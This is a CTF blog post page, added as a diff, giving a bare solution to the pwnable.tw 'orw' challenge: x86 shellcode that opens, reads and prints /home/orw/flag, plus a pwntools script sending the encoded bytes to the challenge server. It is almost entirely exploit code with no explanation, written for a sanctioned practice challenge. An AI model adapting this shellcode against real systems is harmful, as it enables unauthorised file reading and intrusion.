@@ -1,0 +1,321 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>[pwnable.tw] Orw - BangCTF</title>
+  <meta name="author" content="Bang">
+
+  
+  <meta name="description" content="push 0x00 push
+0x67616c66 push
+0x2f77726f push
+0x2f656d6f push
+0x682f2f2f mov eax,5 mov
+ebx,esp mov ecx,0 mov edx,0 int 0x80 mov
+ebx,eax mov eax,3 &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://bangctf.github.io/blog/2018/08/24/pwnable-dot-tw-orw/">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/atom.xml" rel="alternate" title="BangCTF" type="application/atom+xml">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="/javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="//fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="//fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+
+  
+
+</head>
+
+<body   >
+  <header role="banner"><hgroup>
+  <h1><a href="/">BangCTF</a></h1>
+  
+    <h2>To pwn or not to pwn</h2>
+  
+</hgroup>
+
+</header>
+  <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+</ul>
+  
+<form action="https://www.google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="sitesearch" value="bangctf.github.io">
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+  <li><a href="/">Blog</a></li>
+  <li><a href="/blog/archives">Archives</a></li>
+</ul>
+
+</nav>
+  <div id="main">
+    <div id="content">
+      <div>
+<article class="hentry" role="article">
+  
+  <header>
+    
+      <h1 class="entry-title">[pwnable.tw] Orw</h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2018-08-24T17:06:35+08:00'><span class='date'><span class='date-month'>Aug</span> <span class='date-day'>24</span><span class='date-suffix'>th</span>, <span class='date-year'>2018</span></span> <span class='time'>5:06 pm</span></time>
+        
+      </p>
+    
+  </header>
+
+
+<div class="entry-content"><p><br /></p>
+
+<div class="MsoNormal">
+<br /></div>
+
+
+<div class="MsoNormal">
+<span lang="EN-US" style="font-family: &quot;Courier New&quot;;">push 0x00<o:p></o:p></span></div>
+
+
+<div class="MsoNormal">
+<span lang="EN-US" style="font-family: &quot;Courier New&quot;;">push
+0x67616c66<o:p></o:p></span></div>
+
+
+<div class="MsoNormal">
+<span lang="EN-US" style="font-family: &quot;Courier New&quot;;">push
+0x2f77726f<o:p></o:p></span></div>
+
+
+<div class="MsoNormal">
+<span lang="EN-US" style="font-family: &quot;Courier New&quot;;">push
+0x2f656d6f<o:p></o:p></span></div>
+
+
+<div class="MsoNormal">
+<span lang="EN-US" style="font-family: &quot;Courier New&quot;;">push
+0x682f2f2f<o:p></o:p></span></div>
+
+
+<div class="MsoNormal">
+<span lang="EN-US" style="font-family: &quot;Courier New&quot;;">mov eax,5<o:p></o:p></span></div>
+
+
+<div class="MsoNormal">
+<span lang="EN-US" style="font-family: &quot;Courier New&quot;;">mov
+ebx,esp<o:p></o:p></span></div>
+
+
+<div class="MsoNormal">
+<span lang="EN-US" style="font-family: &quot;Courier New&quot;;">mov ecx,0<o:p></o:p></span></div>
+
+
+<div class="MsoNormal">
+<span lang="EN-US" style="font-family: &quot;Courier New&quot;;">mov edx,0<o:p></o:p></span></div>
+
+
+<div class="MsoNormal">
+<span lang="EN-US" style="font-family: &quot;Courier New&quot;;">int 0x80<o:p></o:p></span></div>
+
+
+<div class="MsoNormal">
+<br /></div>
+
+
+<div class="MsoNormal">
+<span lang="EN-US" style="font-family: &quot;Courier New&quot;;">mov
+ebx,eax<o:p></o:p></span></div>
+
+
+<div class="MsoNormal">
+<span lang="EN-US" style="font-family: &quot;Courier New&quot;;">mov eax,3<o:p></o:p></span></div>
+
+
+<div class="MsoNormal">
+<span lang="EN-US" style="font-family: &quot;Courier New&quot;;">mov
+ecx,esp<o:p></o:p></span></div>
+
+
+<div class="MsoNormal">
+<span lang="EN-US" style="font-family: &quot;Courier New&quot;;">mov
+edx,50<o:p></o:p></span></div>
+
+
+<div class="MsoNormal">
+<span lang="EN-US" style="font-family: &quot;Courier New&quot;;">int 0x80<o:p></o:p></span></div>
+
+
+<div class="MsoNormal">
+<br /></div>
+
+
+<div class="MsoNormal">
+<span lang="EN-US" style="font-family: &quot;Courier New&quot;;">mov eax,4<o:p></o:p></span></div>
+
+
+<div class="MsoNormal">
+<span lang="EN-US" style="font-family: &quot;Courier New&quot;;">mov ebx,1<o:p></o:p></span></div>
+
+
+<div class="MsoNormal">
+<span lang="EN-US" style="font-family: &quot;Courier New&quot;;">mov
+ecx,esp<o:p></o:p></span></div>
+
+
+<div class="MsoNormal">
+<span lang="EN-US" style="font-family: &quot;Courier New&quot;;">mov
+edx,50<o:p></o:p></span></div>
+
+
+<div class="MsoNormal">
+<span lang="EN-US" style="font-family: &quot;Courier New&quot;;">int 0x80<o:p></o:p></span></div>
+
+
+<div class="MsoNormal">
+<br /></div>
+
+
+<div class="MsoNormal">
+<span lang="EN-US" style="font-family: &quot;Courier New&quot;;">from pwn
+import *<o:p></o:p></span></div>
+
+
+<div class="MsoNormal">
+<br /></div>
+
+
+<div class="MsoNormal">
+<span lang="EN-US" style="font-family: &quot;Courier New&quot;;">r =
+remote('chall.pwnable.tw',10001)<o:p></o:p></span></div>
+
+
+<div class="MsoNormal">
+<br /></div>
+
+
+<div class="MsoNormal">
+<span lang="EN-US" style="font-family: &quot;Courier New&quot;;">r.send("\x6A\x00\x68\x66\x6C\x61\x67\x68\x6F\x72\x77\x2F\x68\x6F\x6D\x65\x2F\x68\x2F\x2F\x2F\x68\xB8\x05\x00\x00\x00\x89\xE3\xB9\x00\x00\x00\x00\xBA\x00\x00\x00\x00\xCD\x80\x89\xC3\xB8\x03\x00\x00\x00\x89\xE1\xBA\x32\x00\x00\x00\xCD\x80\xB8\x04\x00\x00\x00\xBB\x01\x00\x00\x00\x89\xE1\xBA\x32\x00\x00\x00\xCD\x80")<o:p></o:p></span></div>
+
+
+<div class="MsoNormal">
+<br /></div>
+
+
+<div class="MsoNormal">
+<span lang="EN-US" style="font-family: &quot;Courier New&quot;;">r.interactive()<o:p></o:p></span></div>
+
+
+<p><br /></p>
+</div>
+
+
+  <footer>
+    <p class="meta">
+      
+  
+
+<span class="byline author vcard">Posted by <span class="fn">Bang</span></span>
+
+      
+
+
+
+
+<time class='entry-date' datetime='2018-08-24T17:06:35+08:00'><span class='date'><span class='date-month'>Aug</span> <span class='date-day'>24</span><span class='date-suffix'>th</span>, <span class='date-year'>2018</span></span> <span class='time'>5:06 pm</span></time>
+      
+
+
+    </p>
+    
+      <div class="sharing">
+  
+  
+  
+</div>
+
+    
+    <p class="meta">
+      
+        <a class="basic-alignment left" href="/blog/2018/08/24/pwnable-dot-tw-start/" title="Previous Post: [pwnable.tw] start">&laquo; [pwnable.tw] start</a>
+      
+      
+    </p>
+  </footer>
+</article>
+
+</div>
+
+<aside class="sidebar">
+  
+    <section>
+  <h1>Recent Posts</h1>
+  <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/blog/2018/08/24/pwnable-dot-tw-orw/">[pwnable.tw] Orw</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2018/08/24/pwnable-dot-tw-start/">[pwnable.tw] Start</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2018/08/22/pwnable-dot-kr-fd/">[pwnable.kr] Fd</a>
+      </li>
+    
+  </ul>
+</section>
+
+
+
+
+
+  
+</aside>
+
+
+    </div>
+  </div>
+  <footer role="contentinfo"><p>
+  Copyright &copy; 2018 - Bang -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
+</p>
+
+</footer>
+  
+
+
+
+
+
+
+
+
+
+
+
+</body>
+</html>
